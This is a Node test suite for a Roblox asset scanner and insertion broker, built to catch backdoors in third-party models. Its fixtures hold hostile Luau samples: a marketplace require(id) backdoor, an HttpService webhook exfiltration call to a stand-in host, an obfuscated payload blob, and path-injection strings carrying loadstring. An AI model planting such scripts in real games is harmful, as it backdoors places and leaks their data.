// THE SAFETY SUITE for inserted third-party geometry.
//
// WHAT THIS FILE IS. `asset-qc.test.mjs` pins the gate that runs BEFORE anything is fetched —
// provenance, type, price, creator. This file pins what happens AFTER something lands in a
// customer's place: the script scanner, the style ranker, and the broker that sequences them.
// The scanner is the security-critical half and gets the most tests, because it is the last thing
// standing between a stranger's Luau and someone's game.
//
// THE FIVE FIXTURES the brief names are all here and all named in their test titles: a clean model,
// a model with a plain script, a `require(12345)` backdoor, an obfuscated blob, and an HTTP-calling
// script. They are exercised twice — once through `scanScriptSource` directly, and once end-to-end
// through `brokerAsset` against a fake Studio, so the policy is proven at the unit AND at the
// pipeline level.
//
// NO NETWORK. Every function under test takes an injected `fetchImpl` or an injected bridge. A
// dedicated test asserts that a full broker run with no fetch stub configured never reaches
// apis.roblox.com — the fake fetch records every URL it is asked for.
//
// Run: node --test packages/evals/src/asset-safety.test.mjs
import test from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const HERE = dirname(fileURLToPath(import.meta.url));
const WORKER = join(HERE, '..', '..', '..', 'apps', 'worker');
const dir = mkdtempSync(join(tmpdir(), 'golem-asset-safety-'));
const out = join(dir, 'assets.mjs');
// assets.ts deliberately has no runtime imports, so a plain transpile is the whole build.
execFileSync(join(WORKER, 'node_modules', '.bin', 'esbuild'), [join(WORKER, 'src', 'assets.ts'), '--format=esm', '--outfile=' + out], { stdio: 'pipe', cwd: WORKER });

const A = await import(out);
const {
  scanScriptSource,
  scanInsertedHierarchy,
  scanToText,
  worseSeverity,
  SCAN_LIMITS,
  scoreAssetStyle,
  rankAssetsByStyle,
  styleGateBlocks,
  BRIGHT_SIMULATOR,
  describeAssetRequest,
  inspectCreator,
  isSafeLuauPath,
  buildNormaliseLuau,
  parseNormaliseResult,
  summariseTree,
  brokerAsset,
  BROKER_STEPS,
} = A;

// ==============================================================================================
// Fixtures — the five models the brief names.
// ==============================================================================================

/** A plain gameplay script. Nothing malicious in it; it is still Luau, so it is still removed. */
const PLAIN_SCRIPT = `-- spins the model slowly
local part = script.Parent
while true do
	part.CFrame = part.CFrame * CFrame.Angles(0, 0.01, 0)
	task.wait()
end
`;

/** The classic Roblox backdoor: a module pulled off the marketplace at runtime. */
const REQUIRE_BACKDOOR = `local a = require(3163717554)
a.load(game, "owner")
`;

/** The same backdoor with the id hidden behind a variable — still unresolvable, still refused. */
const REQUIRE_INDIRECT = `local id = 316 .. 3717554
require(tonumber(id))
`;

/** Exfiltration: reads the place and posts it somewhere. */
const HTTP_SCRIPT = `local HttpService = game:GetService("HttpService")
local payload = HttpService:JSONEncode({ place = game.PlaceId })
HttpService:PostAsync("https://example-collector.invalid/api/webhooks/abc", payload)
`;

/** An obfuscated blob: one enormous line, escapes, concat chains, a base64-shaped payload. */
const OBFUSCATED = [
  'local v0=function(...)return(...)end;',
  'local s="' + '\\x68\\x74\\x74\\x70'.repeat(40) + '";',
  'local b="' + 'QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVph'.repeat(6) + '";',
  'local n=' + Array.from({ length: 12 }, (_, i) => `"p${i}"`).join('..') + ';',
].join('');

const cleanModel = { rootPath: 'game.Workspace.Rock', scripts: [], instanceClasses: ['Model', 'MeshPart', 'MeshPart'] };

// ==============================================================================================
// 1. The scanner — per script
// ==============================================================================================

test('A CLEAN MODEL IS THE ONLY THING THAT COMES BACK auto-insertable', () => {
  const scan = scanInsertedHierarchy(cleanModel);
  assert.equal(scan.verdict, 'clean');
  assert.equal(scan.autoInsertable, true);
  assert.equal(scan.scriptCount, 0);
  assert.deepEqual(scan.removePaths, []);
  assert.equal(scan.severity, 'none');
});

test('A MODEL WITH A PLAIN, HARMLESS SCRIPT IS STILL NEVER AUTO-INSERTED', () => {
  const scan = scanInsertedHierarchy({
    rootPath: 'game.Workspace.Spinner',
    scripts: [{ path: 'game.Workspace.Spinner.Spin', className: 'Script', source: PLAIN_SCRIPT }],
    instanceClasses: ['Model', 'Part', 'Script'],
  });
  assert.equal(scan.autoInsertable, false, 'a script of any kind blocks auto-insertion');
  assert.equal(scan.verdict, 'stripped');
  assert.deepEqual(scan.removePaths, ['game.Workspace.Spinner.Spin']);
  // Nothing in it is actually malicious, so it must NOT be escalated to a whole-asset discard.
  assert.equal(scan.severity, 'medium');
  assert.equal(scan.scripts[0].findings.every((f) => f.code === 'script_present'), true);
});

test('THE require(12345) BACKDOOR is critical, names itself, and quotes the line', () => {
  const s = scanScriptSource('game.Workspace.Tree.Main', 'Script', REQUIRE_BACKDOOR);
  const f = s.findings.find((x) => x.code === 'require_asset_id');
  assert.ok(f, 'the asset-id require must be found');
  assert.equal(f.severity, 'critical');
  assert.equal(f.line, 1);
  assert.match(f.excerpt, /require\(3163717554\)/);
  assert.match(f.message, /backdoor/i);
  assert.equal(s.severity, 'critical');
});

test('a require whose id is assembled at runtime is still refused — ambiguity is not a pass', () => {
  const s = scanScriptSource('game.Workspace.X.M', 'ModuleScript', REQUIRE_INDIRECT);
  const codes = s.findings.map((f) => f.code);
  assert.ok(codes.includes('require_dynamic'), 'an unresolvable require must be flagged');
  assert.equal(s.severity, 'critical');
});

test('a legitimate require of the asset\'s own tree is not itself a risk finding', () => {
  const s = scanScriptSource('game.Workspace.Kit.Init', 'ModuleScript', 'local cfg = require(script.Parent.Config)\nreturn cfg\n');
  assert.deepEqual(s.findings.map((f) => f.code), ['script_present'], 'path-shaped requires add no extra risk');
  // ...but it is still Luau, so it is still removed.
  assert.equal(s.action, 'remove');
});

test('AN HTTP-CALLING SCRIPT is caught by service, by call, and by URL', () => {
  const s = scanScriptSource('game.Workspace.Chair.Report', 'Script', HTTP_SCRIPT);
  const codes = new Set(s.findings.map((f) => f.code));
  assert.ok(codes.has('http_service'), 'HttpService use must be flagged');
  assert.ok(codes.has('url_literal'), 'the hard-coded URL must be flagged');
  assert.equal(s.severity, 'critical');
  const webhook = s.findings.find((f) => f.code === 'url_literal' && f.severity === 'critical');
  assert.ok(webhook, 'a /api/webhooks/ URL is the exfiltration endpoint and is critical, not merely high');
});

test('AN OBFUSCATED BLOB is caught on shape alone, with no vocabulary to match on', () => {
  const s = scanScriptSource('game.Workspace.Thing.Loader', 'Script', OBFUSCATED);
  const obf = s.findings.filter((f) => f.code === 'obfuscation');
  assert.ok(obf.length >= 2, `expected several shape signals, got ${obf.map((f) => f.message).join(' | ')}`);
  assert.equal(s.severity, 'critical');
  assert.ok(obf.some((f) => /characters/.test(f.message)), 'the packed line must be reported');
  assert.ok(obf.some((f) => /escapes/.test(f.message)), 'the escape ratio must be reported');
});

test('loadstring / getfenv / setfenv are critical wherever they appear', () => {
  for (const line of ['loadstring(x)()', 'getfenv(1).print = nil', 'setfenv(f, {})']) {
    const s = scanScriptSource('p', 'Script', line);
    assert.ok(s.findings.some((f) => f.code === 'dynamic_code' && f.severity === 'critical'), line);
  }
});

test('a script that reaches for ServerScriptService is critical — that is where a backdoor installs', () => {
  const s = scanScriptSource('p', 'Script', 'script.Parent = game:GetService("ServerScriptService")');
  const codes = new Set(s.findings.map((f) => f.code));
  assert.ok(codes.has('server_container'));
  assert.ok(codes.has('reparent_self'));
  assert.equal(s.severity, 'critical');
});

test('remotes and purchase prompts are flagged in an asset that should be inert', () => {
  const s = scanScriptSource('p', 'LocalScript', 'local r = Instance.new("RemoteEvent")\nMarketplaceService:PromptGamePassPurchase(p, 1)\n');
  const codes = new Set(s.findings.map((f) => f.code));
  assert.ok(codes.has('remote_traffic'));
  assert.ok(codes.has('marketplace_prompt'));
});

test('AN UNREADABLE SOURCE IS THE WORST CASE, NOT THE EMPTY ONE', () => {
  const s = scanScriptSource('game.Workspace.X.Hidden', 'Script', null);
  assert.equal(s.severity, 'critical');
  assert.equal(s.findings[0].code, 'unreadable');
  const scan = scanInsertedHierarchy({ rootPath: 'game.Workspace.X', scripts: [{ path: 'game.Workspace.X.Hidden', className: 'Script', source: null }] });
  assert.equal(scan.verdict, 'reject', 'code nobody can read means the whole asset goes');
});

test('an empty source is NOT the same as an unreadable one', () => {
  const s = scanScriptSource('p', 'Script', '');
  assert.equal(s.severity, 'medium');
  assert.equal(s.findings.some((f) => f.code === 'unreadable'), false);
});

// ==============================================================================================
// 2. The scanner — hierarchy level and the reject/strip boundary
// ==============================================================================================

test('any critical finding escalates from "strip the script" to "discard the asset"', () => {
  const scan = scanInsertedHierarchy({
    rootPath: 'game.Workspace.Tree',
    scripts: [{ path: 'game.Workspace.Tree.Main', className: 'Script', source: REQUIRE_BACKDOOR }],
    instanceClasses: ['Model', 'Part', 'Script'],
  });
  assert.equal(scan.verdict, 'reject');
  assert.equal(scan.autoInsertable, false);
  assert.match(scan.reasons.join(' '), /not fixed by deleting a script/);
});

test('a RemoteEvent with no script at all is still flagged — nothing needs Luau to be suspicious', () => {
  const scan = scanInsertedHierarchy({ rootPath: 'game.Workspace.Crate', scripts: [], instanceClasses: ['Model', 'Part', 'RemoteEvent'] });
  assert.equal(scan.verdict, 'stripped');
  assert.equal(scan.autoInsertable, false);
  assert.ok(scan.findings.some((f) => f.code === 'remote_traffic'));
});

test('an unenumerable hierarchy is rejected — unknown contents are never treated as empty', () => {
  const scan = scanInsertedHierarchy({ rootPath: 'game.Workspace.Big', scripts: [], enumerationFailed: true });
  assert.equal(scan.verdict, 'reject');
  assert.ok(scan.findings.some((f) => f.code === 'unreadable'));
});

test('more scripts than the scan cap is refused on count alone, not partially cleared', () => {
  const scripts = Array.from({ length: SCAN_LIMITS.maxScripts + 5 }, (_, i) => ({ path: `game.Workspace.M.S${i}`, className: 'Script', source: PLAIN_SCRIPT }));
  const scan = scanInsertedHierarchy({ rootPath: 'game.Workspace.M', scripts });
  assert.equal(scan.verdict, 'reject');
  assert.equal(scan.scripts.length, SCAN_LIMITS.maxScripts);
});

test('an enormous source is refused rather than partially scanned', () => {
  const s = scanScriptSource('p', 'Script', 'print("x")\n'.repeat(Math.ceil(SCAN_LIMITS.maxSourceChars / 10) + 100));
  assert.equal(s.severity, 'critical');
  assert.ok(s.findings.some((f) => /only the first/.test(f.message)));
});

test('the scanner never throws, whatever it is handed', () => {
  for (const junk of ['\u0000\u0001\u0002', '\\', '((((((', 'require(', 'ÿ'.repeat(5000)]) {
    assert.doesNotThrow(() => scanScriptSource('p', 'Script', junk));
  }
  assert.doesNotThrow(() => scanInsertedHierarchy({ rootPath: '', scripts: [] }));
});

test('excerpts are capped and stripped of control characters, so a scan is always safe to display', () => {
  const s = scanScriptSource('p', 'Script', 'require(1234567) --' + '\u0007A'.repeat(500));
  for (const f of s.findings) {
    assert.ok(f.excerpt.length <= SCAN_LIMITS.excerptChars, `excerpt was ${f.excerpt.length} chars`);
    assert.equal(/[\u0000-\u001f\u007f]/.test(f.excerpt), false, 'control characters must be stripped');
  }
});

test('scanToText renders every finding and never leaks a full source', () => {
  const scan = scanInsertedHierarchy({ rootPath: 'game.Workspace.T', scripts: [{ path: 'game.Workspace.T.S', className: 'Script', source: HTTP_SCRIPT }] });
  const text = scanToText(scan);
  assert.match(text, /REJECT/);
  assert.match(text, /http_service/);
  assert.ok(text.length < 4000, 'a scan rendering has to fit in a tool result');
});

test('worseSeverity is a total order, so roll-ups cannot disagree with themselves', () => {
  assert.equal(worseSeverity('low', 'critical'), 'critical');
  assert.equal(worseSeverity('high', 'medium'), 'high');
  assert.equal(worseSeverity('medium', 'medium'), 'medium');
});

// ==============================================================================================
// 3. The style ranker (§41)
// ==============================================================================================

const LOWPOLY_CHAIR = {
  assetId: 1,
  name: 'Low Poly Chair',
  triangles: 320,
  hasTexture: false,
  materials: ['SmoothPlastic'],
  dominantColours: [[0.78, 0.85, 0.34], [0.48, 0.73, 0.29]],
  boundsStuds: [3, 4, 3],
  partCount: 5,
  intent: 'chair',
};

const PHOTOREAL_CHAIR = {
  assetId: 2,
  name: 'Photorealistic PBR Armchair 4K Scanned',
  triangles: 48000,
  hasTexture: true,
  textureResolution: 4096,
  materials: ['Marble', 'Glass'],
  dominantColours: [[0.24, 0.22, 0.21], [0.31, 0.29, 0.28]],
  boundsStuds: [3, 4, 3],
  partCount: 1,
  intent: 'chair',
};

test('THE HEADLINE: a photoreal PBR chair loses to a low-poly one in a bright simulator', () => {
  const ranked = rankAssetsByStyle([PHOTOREAL_CHAIR, LOWPOLY_CHAIR], BRIGHT_SIMULATOR);
  assert.equal(ranked[0].candidate.assetId, LOWPOLY_CHAIR.assetId, 'the low-poly chair must rank first');
  assert.equal(ranked[0].score.verdict, 'strong');
  assert.equal(ranked[1].score.verdict, 'reject');
  assert.ok(ranked[0].score.total > ranked[1].score.total + 30, 'the separation must be wide, not marginal');
});

test('the photoreal chair fails DETERMINISTICALLY — no model call is needed to reject it', () => {
  const score = scoreAssetStyle(PHOTOREAL_CHAIR, BRIGHT_SIMULATOR);
  const blocks = styleGateBlocks(score);
  assert.ok(blocks.length >= 3, `expected several hard fails, got ${blocks.join(' | ')}`);
  assert.ok(blocks.some((b) => /texture/i.test(b)), 'a texture map in a flat-shaded style is a hard fail');
  assert.ok(blocks.some((b) => /Marble|Glass|realistic material/i.test(b)), 'a realistic material is an automatic fail (§9)');
  assert.ok(blocks.some((b) => /triangle/i.test(b)), '48k triangles for a prop is a hard fail');
});

test('a desaturated or dark asset is a hard fail — the category has no muted palette and no dark mode', () => {
  const grey = scoreAssetStyle({ ...LOWPOLY_CHAIR, dominantColours: [[0.35, 0.35, 0.36]] }, BRIGHT_SIMULATOR);
  assert.ok(grey.hardFails.some((f) => /saturation/i.test(f)));
  const dark = scoreAssetStyle({ ...LOWPOLY_CHAIR, dominantColours: [[0.05, 0.12, 0.06]] }, BRIGHT_SIMULATOR);
  assert.ok(dark.hardFails.some((f) => /brightness|dark/i.test(f)));
});

test('an asset lying on its side fails scale outright', () => {
  const fallen = scoreAssetStyle({ ...LOWPOLY_CHAIR, intent: 'tree', boundsStuds: [40, 12, 40], triangles: 900 }, BRIGHT_SIMULATOR);
  assert.ok(fallen.hardFails.some((f) => /lying on its side/i.test(f)));
  assert.equal(fallen.verdict, 'reject');
});

test('hard-failed candidates always sort last, even when their weighted total is respectable', () => {
  const mediocre = { assetId: 3, name: 'plain block', triangles: 3900, hasTexture: false, materials: ['Plastic'], boundsStuds: [3, 4, 3], intent: 'chair', dominantColours: [[0.6, 0.78, 0.3]] };
  const ranked = rankAssetsByStyle([PHOTOREAL_CHAIR, mediocre], BRIGHT_SIMULATOR);
  assert.equal(ranked[0].candidate.assetId, 3);
  assert.equal(ranked[1].candidate.assetId, 2);
});

test('unknowns score 0.5 and are REPORTED as unknown — never silently treated as good', () => {
  const bare = scoreAssetStyle({ assetId: 9, name: 'thing' }, BRIGHT_SIMULATOR);
  assert.equal(bare.hardFails.length, 0, 'nothing measured means nothing can hard-fail');
  assert.ok(bare.confidence < 0.4, `confidence should be low, was ${bare.confidence}`);
  assert.ok(bare.axes.some((a) => /unknown|no dominant|no bounding|not (?:reported|measured)/i.test(a.reason)));
  assert.notEqual(bare.verdict, 'strong', 'an unmeasured asset is never "strong"');
});

test('every axis carries a weight, the weights sum to 1, and every axis states a reason', () => {
  const score = scoreAssetStyle(LOWPOLY_CHAIR, BRIGHT_SIMULATOR);
  const sum = score.axes.reduce((a, x) => a + x.weight, 0);
  assert.ok(Math.abs(sum - 1) < 1e-9, `weights summed to ${sum}`);
  for (const a of score.axes) {
    assert.ok(a.reason.length > 10, `${a.axis} has no reason`);
    assert.ok(a.score >= 0 && a.score <= 1, `${a.axis} out of range`);
  }
});

test('the calibrated target is the style spec: its palette is the §1 environment table', () => {
  assert.equal(BRIGHT_SIMULATOR.flatShaded, true);
  assert.ok(BRIGHT_SIMULATOR.palette.length >= 8);
  // #5FC94A, the grass row of the table, in Color3 0..1.
  const grass = BRIGHT_SIMULATOR.palette.find((c) => Math.abs(c[0] - 0x5f / 255) < 1e-9 && Math.abs(c[1] - 0xc9 / 255) < 1e-9);
  assert.ok(grass, 'the grass hex from ROBLOX-STYLE-SPEC §1 must be in the palette');
  assert.ok(BRIGHT_SIMULATOR.bannedMaterials.includes('Marble'));
});

// ==============================================================================================
// 4. Pipeline plumbing: describe, creator, path safety, normalisation, tree
// ==============================================================================================

test('describe strips filler and infers the decision-table row', () => {
  const d = describeAssetRequest({ description: 'can you please add a nice low poly oak tree for my park' });
  assert.equal(d.need, 'foliage');
  assert.equal(/\b(?:can|you|please|a|for|my)\b/.test(d.query), false, `filler survived: ${d.query}`);
  assert.match(d.query, /tree/);
});

test('an untrusted creator is not acceptable, and Roblox itself is trusted by construction', () => {
  const base = { creator: { id: 55, name: 'someone', isVerifiedCreator: false }, isEndorsed: false, upVotePercent: 90, voteCount: 40 };
  assert.equal(inspectCreator(base).acceptable, false);
  assert.equal(inspectCreator({ ...base, creator: { id: 1, name: 'Roblox', isVerifiedCreator: false } }).trust, 'roblox');
  assert.equal(inspectCreator({ ...base, creator: { ...base.creator, isVerifiedCreator: true } }).trust, 'verified');
  assert.equal(inspectCreator({ ...base, isEndorsed: true }).trust, 'endorsed');
});

test('LUAU PATH INJECTION IS FAILED CLOSED — a hostile path yields no code at all', () => {
  assert.equal(isSafeLuauPath('game.Workspace.Tree'), true);
  assert.equal(isSafeLuauPath('game.Workspace["Oak Tree"]'), true);
  for (const evil of [
    'game.Workspace["a"] end; loadstring("x")() --',
    'game.Workspace["a\\"]"]',
    'game.Workspace\nprint(1)',
    'game.Workspace["a`b"]',
    '',
  ]) {
    assert.equal(isSafeLuauPath(evil), false, `should have been refused: ${JSON.stringify(evil)}`);
    assert.equal(buildNormaliseLuau({ path: evil, scale: 1, position: null, reasons: [] }), null);
  }
});

test('normalisation refuses absurd scales and non-finite positions rather than emitting them', () => {
  const p = { path: 'game.Workspace.T', reasons: [] };
  assert.equal(buildNormaliseLuau({ ...p, scale: 0, position: null }), null);
  assert.equal(buildNormaliseLuau({ ...p, scale: 1e9, position: null }), null);
  assert.equal(buildNormaliseLuau({ ...p, scale: 1, position: [0, NaN, 0] }), null);
  const good = buildNormaliseLuau({ ...p, scale: 2.5, position: [10, 0, -4] });
  assert.match(good, /ScaleTo\(2\.5000\)/);
  assert.match(good, /PivotTo\(CFrame\.new\(10\.000, 0\.000, -4\.000\)\)/);
  assert.match(good, /Anchored = true/);
});

test('the normalisation report survives the wrappers run_code puts around it', () => {
  const payload = '{"anchored":7,"scaled":2.0,"size":[3,4,3],"pos":[0,2,0]}';
  for (const wrapped of [payload, { result: payload }, { result: { t: 'string', v: payload } }, { data: { result: payload } }]) {
    const parsed = parseNormaliseResult(wrapped);
    assert.equal(parsed.anchored, 7);
    assert.deepEqual(parsed.size, [3, 4, 3]);
  }
  assert.equal(parseNormaliseResult('{"error":"target not found"}'), null);
  assert.equal(parseNormaliseResult('not json'), null);
});

test('summariseTree measures the bounding box and notices a truncated walk', () => {
  const tree = { root: { name: 'M', class: 'Model', children: [
    { name: 'A', class: 'Part', pos: [0, 2, 0], size: [4, 4, 4] },
    { name: 'B', class: 'Part', pos: [10, 2, 0], size: [2, 2, 2] },
  ] } };
  const s = summariseTree(tree);
  assert.deepEqual(s.classes, ['Model', 'Part', 'Part']);
  assert.deepEqual(s.bounds, [13, 4, 4]);
  assert.equal(s.truncated, false);
  assert.equal(summariseTree({ root: { name: 'M', class: 'Model', moreChildren: 40 } }).truncated, true);
});

// ==============================================================================================
// 5. The broker end to end, against a fake Studio and a fake Creator Store
// ==============================================================================================

const HIT = (id, name) => ({ asset: { id, name, typeId: 40 }, creator: { id: 1, name: 'Roblox' }, fiatProduct: { isFree: true } });

const DETAILS = (id, name, extra = {}) => ({
  data: [
    {
      asset: { id, name, typeId: 40, hasScripts: false, scriptCount: 0, visibilityStatus: 1, capabilities: {}, modelTechnicalDetails: { objectMeshSummary: { triangles: 800, vertices: 500 } }, ...extra },
      creator: { id: 1, name: 'Roblox', isVerifiedCreator: true },
      voting: { upVotePercent: 96, voteCount: 400 },
      fiatProduct: { isFree: true, purchasable: true },
    },
  ],
});

/** Records every URL asked for, so a test can prove nothing real was contacted. */
function fakeStore(details = DETAILS(101, 'Low Poly Crate')) {
  const urls = [];
  const fetchImpl = async (url) => {
    urls.push(url);
    if (url.includes('marketplace') || url.includes('assets:search')) {
      return { ok: true, status: 200, json: async () => ({ data: [HIT(101, 'Low Poly Crate')] }) };
    }
    return { ok: true, status: 200, json: async () => details };
  };
  return { fetchImpl, urls };
}

/**
 * A fake Studio. `scripts` is the hierarchy the plugin will report AFTER insertion — i.e. what the
 * metadata gate could not see. Deletions actually mutate it, so `verify` is a real re-read.
 */
function fakeStudio({ scripts = [], classes = ['Model', 'MeshPart'], failOn = null } = {}) {
  const state = { scripts: scripts.slice(), deleted: [], calls: [] };
  const bridge = {
    async execStudioOp(op) {
      state.calls.push(op.op);
      if (failOn === op.op) return { ok: false, error: `fake failure on ${op.op}` };
      switch (op.op) {
        case 'insert_asset':
          return { ok: true, data: { inserted: ['game.Workspace.Crate'] } };
        case 'get_tree':
          return { ok: true, data: { root: { name: 'Crate', class: classes[0], pos: [0, 2, 0], size: [4, 4, 4], children: classes.slice(1).map((c, i) => ({ name: `C${i}`, class: c })) } } };
        case 'list_scripts':
          return { ok: true, data: { scripts: state.scripts.map((s) => ({ path: s.path, class: s.className })) } };
        case 'read_script': {
          const found = state.scripts.find((s) => s.path === op.path);
          return found && found.source !== null ? { ok: true, data: { source: found.source } } : { ok: false, error: 'unreadable' };
        }
        case 'delete_instances':
          state.deleted.push(...op.paths);
          state.scripts = state.scripts.filter((s) => !op.paths.includes(s.path) && !op.paths.some((p) => s.path.startsWith(p + '.')));
          return { ok: true, data: { deleted: op.paths } };
        case 'run_code':
          return { ok: true, data: { result: '{"anchored":3,"scaled":0,"size":[4,4,4],"pos":[0,2,0]}' } };
        default:
          return { ok: true, data: {} };
      }
    },
  };
  return { bridge, state };
}

test('THE HAPPY PATH: a clean asset walks the whole pipeline in order and ends verified', async () => {
  const store = fakeStore();
  const studio = fakeStudio();
  const r = await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, true, r.summary);
  const order = r.steps.map((s) => s.step);
  assert.deepEqual(order, BROKER_STEPS.slice(), 'every step must run, in the declared order');
  assert.equal(r.scan.verdict, 'clean');
  assert.equal(r.chosen.assetId, 101);
  // The order that matters: the hierarchy is never read before it exists, and never after it is used.
  assert.ok(studio.state.calls.indexOf('insert_asset') < studio.state.calls.indexOf('list_scripts'));
});

test('A BACKDOORED MODEL THAT PASSED THE METADATA GATE IS DELETED, WHOLE, AFTER INSERTION', async () => {
  const store = fakeStore();
  const studio = fakeStudio({ scripts: [{ path: 'game.Workspace.Crate.Main', className: 'Script', source: REQUIRE_BACKDOOR }], classes: ['Model', 'MeshPart', 'Script'] });
  const r = await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, false);
  assert.equal(r.aborted.step, 'scan_scripts');
  assert.equal(r.scan.verdict, 'reject');
  assert.deepEqual(studio.state.deleted, ['game.Workspace.Crate'], 'the whole asset goes, not just the script');
  assert.match(r.summary, /backdoor/i);
});

test('a plain script is stripped and the place is PROVEN clean by re-reading it', async () => {
  const store = fakeStore();
  const studio = fakeStudio({ scripts: [{ path: 'game.Workspace.Crate.Spin', className: 'Script', source: PLAIN_SCRIPT }], classes: ['Model', 'MeshPart', 'Script'] });
  const r = await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, true, r.summary);
  assert.deepEqual(r.removed, ['game.Workspace.Crate.Spin']);
  assert.equal(r.scan.verdict, 'stripped');
  // verify re-lists AFTER the delete; the fake actually removed the row, so this is a real proof.
  assert.equal(studio.state.calls.filter((c) => c === 'list_scripts').length, 2);
});

test('an HTTP-calling script that survives the metadata gate causes a whole-asset discard', async () => {
  const store = fakeStore();
  const studio = fakeStudio({ scripts: [{ path: 'game.Workspace.Crate.Beacon', className: 'Script', source: HTTP_SCRIPT }] });
  const r = await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, false);
  assert.deepEqual(studio.state.deleted, ['game.Workspace.Crate']);
});

test('a script whose source cannot be read discards the asset rather than assuming it is fine', async () => {
  const store = fakeStore();
  const studio = fakeStudio({ scripts: [{ path: 'game.Workspace.Crate.Hidden', className: 'Script', source: null }] });
  const r = await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, false);
  assert.equal(r.scan.verdict, 'reject');
  assert.deepEqual(studio.state.deleted, ['game.Workspace.Crate']);
});

test('a failed post-removal listing is a refusal, because the place cannot be proven clean', async () => {
  const store = fakeStore();
  const studio = fakeStudio({ failOn: 'list_scripts' });
  const r = await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, false);
  assert.ok(['scan_scripts', 'verify'].includes(r.aborted.step), r.aborted.step);
});

test('a script-bearing asset never reaches Studio when the METADATA already says so', async () => {
  const store = fakeStore(DETAILS(101, 'Crate', { hasScripts: true, scriptCount: 2 }));
  const studio = fakeStudio();
  const r = await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, false);
  assert.equal(r.aborted.step, 'select');
  assert.equal(studio.state.calls.length, 0, 'nothing may touch the place when the gate already refused');
  assert.equal(r.considered[0].verdict, 'fail_has_scripts');
});

test('the style gate can refuse a perfectly safe asset — valid is not the same as right', async () => {
  const store = fakeStore(DETAILS(101, 'Photorealistic PBR Scanned Crate 4K', { modelTechnicalDetails: { objectMeshSummary: { triangles: 90000, vertices: 60000 } } }));
  const studio = fakeStudio();
  const r = await brokerAsset({}, { description: 'a crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, false);
  assert.equal(r.aborted.step, 'select');
  assert.equal(r.considered[0].verdict, 'pass', 'it passed every SAFETY assertion');
  assert.equal(r.considered[0].style.verdict, 'reject', 'and still lost on style');
  assert.equal(studio.state.calls.length, 0);
});

test('the decision table has the last word: a need it never routes to the store is refused first', async () => {
  const store = fakeStore();
  const studio = fakeStudio();
  const r = await brokerAsset({}, { description: 'a big house', need: 'building' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, false);
  assert.equal(r.aborted.step, 'describe');
  assert.equal(store.urls.length, 0, 'no request may be made for a need the table refuses');
});

test('dryRun stops at select and never touches the place', async () => {
  const store = fakeStore();
  const studio = fakeStudio();
  const r = await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl, dryRun: true });
  assert.equal(r.ok, true);
  assert.equal(studio.state.calls.length, 0);
  assert.deepEqual(r.steps.map((s) => s.step).slice(-1), ['select']);
});

test('NO NETWORK: every URL the broker asked for went to the injected fake', async () => {
  const store = fakeStore();
  const studio = fakeStudio();
  await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.ok(store.urls.length > 0, 'the broker must have gone through the injected fetch');
  for (const u of store.urls) assert.match(u, /^https:\/\/apis\.roblox\.com\//, u);
});

test('the broker never throws — a Studio that fails every op is a refusal with an audit trail', async () => {
  const store = fakeStore();
  const bridge = { async execStudioOp() { return { ok: false, error: 'studio is on fire' }; } };
  const r = await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, false);
  assert.equal(r.aborted.step, 'insert');
  assert.ok(r.steps.length >= 6, 'the trail up to the failure must survive');
  assert.match(r.summary, /REFUSED at insert/);
});
